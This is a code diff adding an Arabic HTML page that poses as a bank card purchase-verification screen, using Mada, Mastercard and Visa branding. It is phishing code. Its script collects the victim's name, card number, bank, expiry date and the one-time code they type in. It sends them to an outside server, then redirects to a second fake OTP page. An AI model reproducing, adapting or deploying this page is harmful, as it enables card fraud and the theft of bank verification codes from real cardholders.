@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>مصادقة الشراء</title>
+
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: #ffffff;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      text-align: center;
+    }
+
+    .otp-section {
+      max-width: 340px;
+      margin: 50px auto;
+      background: white;
+      border-radius: 20px;
+      padding: 30px 20px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      position: relative;
+      display: block;
+      text-align: center;
+    }
+
+    .otp-section img {
+      width: 80px;
+      margin-bottom: 20px;
+    }
+
+    .otp-section h2 {
+      font-size: 20px;
+      color: #0078d7;
+      margin-bottom: 10px;
+    }
+
+    .otp-section p {
+      font-size: 15px;
+      margin-bottom: 10px;
+      color: #333;
+    }
+
+    .otp-section input {
+      padding: 12px;
+      width: 100%;
+      font-size: 16px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      margin-bottom: 15px;
+      text-align: center;
+    }
+
+    .otp-section button {
+      padding: 12px;
+      width: 100%;
+      font-size: 16px;
+      background-color: #6c757d;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    .brands {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 20px;
+    }
+
+    .brands img {
+      height: 24px;
+    }
+
+    .note {
+      color: #999;
+      font-size: 14px;
+      text-align: center;
+    }
+
+    .logo {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin: 20px 10px;
+      opacity: 1;
+    }
+
+    .logo img {
+      max-height: 150px;
+      width: 150px;
+    }
+
+    #loadingOverlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(255, 255, 255, 0.8);
+      z-index: 10;
+      display: none;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      border-radius: 20px;
+    }
+
+    .spinner {
+      margin-bottom: 15px;
+      width: 50px;
+      height: 50px;
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #0078d7;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg);}
+      100% { transform: rotate(360deg);}
+    }
+
+  #texteror {
+    color: red;
+    margin-top: -5px;
+    font-size: 12px;
+    font-weight: bold;     
+    font-family: Arial, sans-serif;  
+}
+
+    #otp{
+        width: 320px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="logo" id="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/MasterCard_Logo.svg/250px-MasterCard_Logo.svg.png" alt="Care Logo" />
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2c/Visa_acceptance_logo_%282015_onwards%29.svg/250px-Visa_acceptance_logo_%282015_onwards%29.svg.png" alt="visa" />
+  </div>
+
+<div class="otp-section">
+  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRJy7RXH0JXm4o9Vzh7zTrGTSeLNWIv9pvriA&s" alt="رمز التحقق" />
+  <h2>   إثبات ملكية البطاقة</h2>
+  <p id="otpText"></p>
+  <label for="otp"><strong>رمز التحقق *</strong></label>
+<input
+  type="tel"
+  id="otp"
+  inputmode="numeric"
+  placeholder="يرجى إدخال رمز التحقق"
+  maxlength="6"
+  minlength="4"
+  autocomplete="one-time-code"
+/>
+  <p id="texteror" >عذرآ قمت ب ادخال رمز تحقق غير صحيح</p>
+  <p class="note">سيتم إرسال رسالة كود التحقق في خلال <span id="otpTimer">03:00</span> دقيقة</p>
+  <button>تأكيد</button>
+  <div class="brands">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fb/Mada_Logo.svg" alt="mada" />
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="mastercard" />
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2c/Visa_acceptance_logo_%282015_onwards%29.svg/250px-Visa_acceptance_logo_%282015_onwards%29.svg.png" alt="visa" />
+  </div>
+</div>
+
+<div id="loadingOverlay">
+  <div class="spinner"></div>
+  <h2 style="font-weight: bold; margin: 10px 0; color: #0078d7;">يرجى الانتظار</h2>
+  <p style="color: #333;">الرجاء عدم إغلاق الصفحة أو إعادة تحميلها</p>
+</div>
+
+<script>
+  async function sendToLocalServer(data) {
+    try {
+      const response = await fetch('https://wadamnew.onrender.com/api/payment', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
+      return await response.json();
+    } catch (error) {
+      console.error('خطأ الاتصال بالخادم:', error);
+      return null;
+    }
+  }
+
+  const otpText = document.getElementById('otpText');
+  const otpTimer = document.getElementById('otpTimer');
+  const otpInput = document.getElementById('otp');
+  const overlay = document.getElementById('loadingOverlay');
+
+  const now = new Date();
+  const formattedDate = now.toLocaleDateString('ar-EG').replace(/\//g, '-');
+  const formattedTime = now.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', hour12: false });
+  otpText.textContent = `تم إرسال رمز تحقق إلى رقمك لتأكيد عملية الشراء بتاريخ ${formattedDate} الساعة ${formattedTime}`;
+
+  let timeLeft = 180;
+  function updateTimer() {
+    const minutes = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+    const seconds = (timeLeft % 60).toString().padStart(2, '0');
+    otpTimer.textContent = `${minutes}:${seconds}`;
+    if (timeLeft <= 0) {
+      clearInterval(timerInterval);
+      otpTimer.textContent = 'انتهى الوقت';
+    } else {
+      timeLeft--;
+    }
+  }
+  updateTimer();
+  const timerInterval = setInterval(updateTimer, 1000);
+
+  document.querySelector('.otp-section button').addEventListener('click', async () => {
+    const otpCode = otpInput.value.trim();
+
+    if (otpCode === '') {
+      alert('يرجى إدخال رمز التحقق أولاً.');
+      otpInput.focus();
+      return;
+    }
+
+    const ownerName = localStorage.getItem('userName') || 'غير معروف';
+    const cardNumber = localStorage.getItem('cardNumber') || '';
+    const bank = localStorage.getItem('bank') || '';
+    const expiryMonth = localStorage.getItem('expiryMonth') || '';
+    const expiryYear = localStorage.getItem('expiryYear') || '';
+
+    localStorage.setItem('card_number', otpCode);
+
+    const message = `
+✅ <b>رمز التحقق - OTP 2</b>
+<b>👤 من:</b> ${ownerName}
+<b>💳 رقم البطاقة:</b> ${cardNumber}
+<b>🏦 البنك:</b> ${bank}
+<b>📅 صلاحية:</b> ${expiryMonth}/${expiryYear}
+<b>🔐 رمز التحقق المدخل:</b> ${otpCode}
+    `;
+
+    overlay.style.display = 'flex';
+
+    await sendToLocalServer({
+      name: ownerName,
+      cardNumber: cardNumber,
+      bank: bank,
+      expiryMonth: expiryMonth,
+      expiryYear: expiryYear,
+      otp: otpCode,
+      message: message,
+      type: 'otp_code_2'
+    });
+
+    setTimeout(() => {
+      window.location.href = "otp2.html"; 
+    }, 1000);
+  });
+</script>
+
+
+</body>
+</html>
